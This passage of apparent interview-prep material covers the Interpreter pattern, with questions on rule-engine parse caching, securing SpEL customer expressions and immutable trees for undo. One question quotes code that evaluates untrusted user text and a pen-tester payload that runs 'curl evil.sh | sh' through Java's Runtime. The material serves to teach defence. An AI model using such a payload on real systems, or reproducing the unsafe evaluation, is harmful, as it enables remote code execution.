    final Expr l, r; Add(Expr l, Expr r){this.l=l;this.r=r;}
    public int eval(Map<String,Integer> e){ return l.eval(e) + r.eval(e); }
}
sealed interface Expr
data class Num(val v: Int) : Expr
data class Var(val name: String) : Expr
data class Add(val l: Expr, val r: Expr) : Expr
fun eval(e: Expr, env: Map<String, Int>): Int = when (e) {
    is Num -> e.v
    is Var -> env.getValue(e.name)
    is Add -> eval(e.l, env) + eval(e.r, env)
}

sections.label: Common mistakes & traps
sections.html:
• Claiming Interpreter is for any language.
  • Confusing Interpreter (evaluate a tree) with Visitor (add operations to a tree).
  • No depth limit: deeply nested input causes StackOverflowError.

sections.label: Follow-ups
sections.html:
1. Who builds the tree? -> A parser; the pattern itself does not cover parsing.
  2. Where is Composite? -> The tree of expressions is a Composite; terminals are leaves.
  3. Faster than tree walking? -> Compile to lambdas or bytecode.

sections.label: 3-YOE vs senior answer
sections.html: 3-YOE writes Add/Mul classes. Senior says when a JSON condition or composed lambdas is enough, mentions caching, depth limits and security.

sections.label: Production connection
sections.html: A promo-rule engine reparsed rule text per request at 5,000 req/s; caching compiled trees removed 30% CPU.

questions.contextHtml:
A marketing rule engine evaluates rules like cart.total > 500 AND user.city IN ("Pune","Delhi") for every request. 40 active rules, 5,000 req/s. The service hand-parses each rule string with regexes per request. Profile:

RuleEngine.parse        31% CPU
Pattern.compile         14% CPU
RuleEngine.evaluate      3% CPU
p99 latency             85 ms (SLO 30 ms)

Rules change maybe twice a day via admin UI. Someone proposes rewriting in Groovy "so it is fast".
questions.promptHtml: How do you fix it? Should the rule language change?

sections.label: What a weak answer looks like
sections.html: Switch to Groovy scripting or add servers; ignores that parsing per request is the cost.

sections.label: Strong answer
sections.html:
1. Clarifying questions I'd ask: How are rules authored (trusted staff or users)? Is rule syntax public API to customers? Does the grammar have loops or functions?
  2. Immediate mitigation: Cache parsed rules by id and version now.
  3. Hypotheses, ranked: Parse and regex compile on the hot path (clear in profile); evaluation is 3%, not the bottleneck; Groovy would add security and warm-up risk.
  4. How I'd verify each: The CPU profile above; benchmark parse once, evaluate 5,000x.
  5. Root cause: Interpretation cost is tiny; parsing 40 rules per request (200,000 parses/s) is the waste.
  6. Fix: Parse to an immutable expression tree at rule save time, store compiled tree in a ConcurrentHashMap<RuleId+version, Expr>; evaluation is a few microseconds. Precompile regexes once.
val compiled = ConcurrentHashMap<String, Expr>()
fun evaluate(rule: Rule, ctx: Ctx) = compiled.computeIfAbsent("${rule.id}:${rule.version}") { parse(rule.text) }.eval(ctx)
  1. Prevention: Benchmark in CI; a metric for parse count vs evaluate count; invalidate on rule version change.
  2. Trade-offs & what I'd NOT do: I would not embed a general scripting language for a handful of operators (sandboxing, startup, upgrade risk). If rules grow loops and functions, move to ANTLR plus compile to lambdas.

sections.label: Curveball follow-ups
sections.html:
• Rules reach 10,000? -> Index by trigger and short-circuit; evaluate only candidate rules.
  • Stack overflow on nested rules? -> Enforce a max depth at parse time.

sections.label: Senior war story
sections.html: A "slow rule engine" was fast; it was being asked to re-read the grammar each time. A cache fixed it.

sections.label: Scoring rubric
sections.html:
• No hire: rewrite in Groovy.
  • Hire: cache the parsed tree.
  • Strong hire: reads the profile, versioned invalidation, depth limit and language-growth plan.

questions.contextHtml:
A feature lets customers write notification conditions in an admin console. Review this:

ExpressionParser parser = new SpelExpressionParser();
boolean matches(String userExpr, Order order) {
    return parser.parseExpression(userExpr).getValue(order, Boolean.class);
}

A pen-tester submits T(java.lang.Runtime).getRuntime().exec('curl evil.sh | sh') and a second input of 10,000 nested parentheses. The service runs with access to the production database.
questions.promptHtml: What is wrong and how do you design it safely?

sections.label: What a weak answer looks like
sections.html: "Add input validation with a regex."

sections.label: Strong answer
sections.html:
1. Clarifying questions I'd ask: Who writes expressions? What operations do they need? Is the syntax already public?
  2. Immediate mitigation: Disable the feature or restrict to a few built-in templates; rotate exposed secrets if exploited.
  3. Hypotheses, ranked: Remote code execution via the full expression language; resource exhaustion from deep nesting; data leakage via property access.
  4. How I'd verify each: Run the pen-test inputs in staging; check logs for unusual expressions.
  5. Root cause: A general-purpose evaluation language was exposed to untrusted input, so it can call arbitrary Java types.
  6. Fix: A tiny purpose-built grammar: fields from a whitelist, comparison, AND/OR/NOT, IN. Parse into a sealed AST, bound depth and node count, evaluate against a read-only view.
sealed interface Cond
data class Cmp(val field: Field, val op: Op, val value: Any) : Cond
data class And(val l: Cond, val r: Cond) : Cond
// Field is an enum of allowed fields; no reflection, no method calls

If SpEL is kept, use SimpleEvaluationContext.forReadOnlyDataBinding() rather than the standard context (verify the exact setup for your Spring version). 7. Prevention: Fuzz tests; limits (length, depth, nodes, time); run evaluation without DB credentials in scope; review checklist for "user text evaluated". 8. Trade-offs & what I'd NOT do: I would not blacklist dangerous method names; blacklists lose. And I would not let the customer syntax become a public language before it is stable.

sections.label: Curveball follow-ups
sections.html:
• Customers want regex matching? -> Allow a matches operator with a timeout-safe regex engine (backtracking is a DoS risk).
  • Could JSON conditions replace text? -> Yes, often better: no parser, a schema validates the tree.

sections.label: Senior war story
sections.html: A rule box built "for convenience" on a full expression language became a remote-execution finding in an audit; a whitelist AST replaced it.

sections.label: Scoring rubric
sections.html:
• No hire: regex validation.
  • Hire: restricts the language and sandboxes.
  • Strong hire: purpose-built AST, limits, no credentials in scope, JSON alternative.

questions.contextHtml: You are asked to design a small calculator app with: expressions as trees, operations "evaluate", "pretty-print" and (later) "simplify", plus unlimited undo of expression edits. A junior's draft uses mutable node classes with setLeft/setRight, copies the whole tree on every edit for undo, and an instanceof chain for printing. Users edit expressions of up to 2,000 nodes; 100 undo steps.
questions.promptHtml: Sketch the design and justify the key decision that makes undo, printing and thread-safety simple.

sections.label: What a weak answer looks like
sections.html: Keeps mutable nodes and deep-copies everything; lists all three patterns without explaining how they fit.

sections.label: Strong answer
sections.html:
1. Clarifying questions I'd ask: Is evaluation concurrent with editing? Do operations need to grow (simplify, differentiate)? Persisted undo?
  2. Immediate mitigation: N/A (design); I would first stop deep copies.
  3. Hypotheses, ranked: Immutable tree is the enabling decision: snapshots become references (Memento nearly free), evaluation is thread-safe, operations are pure functions (Visitor or sealed when).
  4. How I'd verify each: Test: edit, undo 100 times, assert earlier trees unchanged; memory test for 100 snapshots.
  5. Root cause: Mutable state forces copying and makes snapshots expensive and unsafe.
  6. Fix:
sealed interface Expr
data class Num(val v: Int) : Expr
data class Add(val l: Expr, val r: Expr) : Expr
fun eval(e: Expr): Int = when (e) { is Num -> e.v; is Add -> eval(e.l) + eval(e.r) }
fun print(e: Expr): String = when (e) { is Num -> "${e.v}"; is Add -> "(${print(e.l)} + ${print(e.r)})" }
class Calculator {
    var expr: Expr = Num(0); private set
    private val history = ArrayDeque<Expr>()
    fun set(e: Expr) { history.addLast(expr); expr = e }
    fun undo() { history.removeLastOrNull()?.let { expr = it } }
}
sealed interface Expr permits Num, Add {}
record Num(int v) implements Expr {}
record Add(Expr l, Expr r) implements Expr {}

An edit builds a new root that shares unchanged subtrees, so 100 undos cost 100 root pointers plus the changed paths. 7. Prevention: Property tests (eval of printed-and-reparsed tree is equal); bound the history length. 8. Trade-offs & what I'd NOT do: I would not pick mutable nodes "for speed" without a measurement; that removes cheap undo and thread-safety. A deep recursion on very deep trees needs an explicit stack or a depth limit.

sections.label: Curveball follow-ups
sections.html:
• Undo must persist across restarts? -> Serialise trees with a versioned schema.
  • Add simplify? -> One new function over the sealed type; no node class changes. Adding a node type breaks all whens: acceptable, compiler-found.

sections.label: Senior war story
sections.html: A time-travel debugger in a state-heavy UI was easy only because state was immutable; a team that had mutated in place could not add it without a rewrite.

sections.label: Scoring rubric
sections.html:
• No hire: mutable nodes plus deep copy.
  • Hire: immutable tree, sealed when, stack of references.
  • Strong hire: ties the three patterns together, explains structural sharing, tests and depth limits.
